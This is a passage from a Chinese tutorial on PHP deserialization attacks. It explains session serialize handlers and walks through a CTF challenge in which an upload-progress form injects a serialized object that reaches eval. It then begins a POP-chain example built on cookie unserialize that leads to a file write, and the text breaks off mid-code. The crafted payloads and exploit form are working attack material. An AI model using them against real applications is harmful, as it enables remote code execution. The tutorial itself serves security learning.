title="Session反序列化"></a><strong>Session反序列化</strong></h4><p>php的session在存储和读取的时候，会进行序列化和反序列化，在php中有3种序列化的方式，当在php.ini中设置如下值：</p><table><thead><tr><th>session.serialize_handler</th><th>存储方式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize序列化的字符串</td></tr><tr><td>php_serialize</td><td>serialize序列化的的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符＋键名＋经过serialize()函数反序列处理的值</td></tr></tbody></table><p>举个列子</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'fanxing'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>当session.serialize_handler为php的时候，存储的session结果为</p><pre><code>name|s:7:&quot;fanxing&quot;;</code></pre><p>当session.serialize_handler为php_serialize的时候，存储的session结果为</p><pre><code>a:1:{s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;}</code></pre><p>当session.serialize_handler为php_binary的时候，存储的session结果为</p><pre><code>二进制字符串names:7:&quot;fanxing&quot;</code></pre><p>php大于5.5.4的版本默认使用的是php_serialize。</p><p>在php.ini中，还要了解一些关于session的配置：</p><p>session.save_path    session保存的路径</p><p>session.upload_progress.cleanup    上传完成后(POST)会立即删除进度，默认开启</p><p>session.upload_progress.enabled    将上传的进度存于session，默认开启</p><pre><code>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</code></pre><p>这里利用CTF的一道题目：<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//A webshell is wait for you</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'sessiontest.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>可以看到题目使用的是php5.6.21，默认使用的是php_serialize，而题目使用的是php，所以可以利用session.upload_progress.enabled来构造session。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://web.jarvisoj.com:32784/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    &lt;input type="hidden" name="<span class="token prolog">&lt;?php echo ini_get("session.upload_progress.name"); ?></span>" value="123" />    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>构造payload</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token operator">=</span><span class="token string">'print_r(dirname(__FILE__));'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>在filename处提交payload：|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(<strong>FILE</strong>));&quot;;}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/3.png" alt="3" loading="lazy"></p><p>之后就可以构造payload读取本地的文件，具体可以参考<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">先知twosmi1e师傅</a>和博客<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">Mochazz师傅的文章</a>。</p><h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a><strong>POP链构造</strong></h4><p>在反序列化攻击中，一般都要寻找魔术方法中的一些敏感函数来触发漏洞，当魔法方法中不存在敏感函数时，需要构造pop链寻找相同函数将类的属性和敏感函数联系到一起。</p><p>这里，参考了这位<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">师傅</a>的题目，题目部分代码我删了下，看原题可以去连接看这位师傅的。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OutputFilter</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$matchPattern</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$replacement</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$repl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span> <span class="token operator">=</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span> <span class="token operator">=</span> <span class="token variable">$repl</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogFileFormat</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">,</span> <span class="token variable">$endl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token operator">=</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span> <span class="token operator">=</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogWriter_File</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$format</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//TODO: Modify the address here, and delete this TODO.</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"D:\\phpStudy\\WWW\\ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logwriter</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里装入LogWriter_File对象</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$writer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span> <span class="token operator">=</span> <span class="token variable">$writer</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//这里偷梁换柱Song的log</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Song</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$group</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$group</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span> <span class="token operator">=</span> <span class="token variable">$group</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$url</span><span class="token punctuation">;</span>        <span class="token variable">$fltr</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OutputFilter</span><span class="token punctuation">(</span><span class="token string">"/\[i\](.*)\[\/i\]/i"</span><span class="token punctuation">,</span> <span class="token string">"&lt;i>\\1&lt;/i>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LogWriter_File</span><span class="token punctuation">(</span><span class="token string">"song_views"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LogFileFormat</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$fltr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;a href='"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>url <span class="token punctuation">.</span> <span class="token string">"'>&lt;i>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/i>&lt;/a> by "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logger</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Song "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">" by [i]"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span> <span class="token punctuation">.</span> <span class="token string">"[/i] viewed.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Lyrics</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$song</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lyrics</span><span class="token punctuation">,</span> <span class="token variable">$song</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span> <span class="token operator">=</span> <span class="token variable">$song</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span> <span class="token operator">=</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>&lt;p>"</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">shortForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>&lt;a href='song.php?name="</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>song<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">name_is</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">addLyrics</span><span class="token punctuation">(</span><span class="token variable">$lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$oldlyrics</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$oldlyrics</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$lyrics</span> <span class="token keyword">as</span> <span class="token variable">$lyric</span><span class="token punctuation">)</span> <span class="token variable">$oldlyrics</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token variable">$lyric</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'lyrics'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$oldlyrics</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getLyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'lyrics'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>User<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getLyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在进行反序列化漏洞的时候，我们需要找到可控的unserialize，这里发现$_COOKIE[‘lyrics’]参数可控，有了可控的参数，就需要找到魔术方法来自动调用，这里危险函数在LogWriter_File这个类，这时就需要构造POP链了。</p><p>首先来看魔术方法，在Lyrics类中存在两个魔术方法，发现对象在销毁的时候调用了$this-&gt;song-&gt;log()，而log方法又在Logger这个类中存在，所以属性$this-&gt;song应该为new Logger()。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Lyrics</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$song</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>&lt;p>"</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">shortForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>&lt;a href='song.php?name="</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>song<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 